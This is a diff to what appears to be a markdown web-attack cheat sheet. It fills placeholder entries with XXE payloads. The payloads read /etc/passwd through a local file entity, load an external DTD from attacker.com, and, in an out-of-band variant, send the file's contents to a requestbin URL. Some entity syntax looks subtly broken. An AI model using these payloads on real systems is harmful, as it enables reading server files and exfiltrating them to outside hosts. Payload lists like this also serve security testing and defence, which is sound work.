@@ -84,13 +84,41 @@ Basic XXE Test
 ```
 
 Local File Inclusion  
-* subtext  
+```xml
+<!DOCTYPE data [
+  <!ELEMENT lol ANY>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<lol>&xxe;</lol>
+```
 
-External File Inclusion  
-* subtext  
+Remote File Inclusion / SSRF
+_stuff.xml_
+```xml
+<!DOCTYPE data [
+  <!ELEMENT lol ANY>
+  <!ENTITY xxe SYSTEM "https://attacker.com/evil.dtd">
+  &xxe;
+]>
+<lol>&file;</lol>
+```
+_evil.dtd_
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+```
 
 XXE Out of Bounds attack (XXE OOB)  
-* subtext
+```xml
+<!DOCTYPE data [
+  <!ELEMENT lol ANY>
+  <!ENTITY xxe SYSTEM "https://attacker.com/evil.dtd">
+  &xxe; &all;
+]>
+```
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://requestbin.fullcontact.com/1cxrgsm1/?%file;'>">
+```
 
 ### PHP Un-serialize
 ---
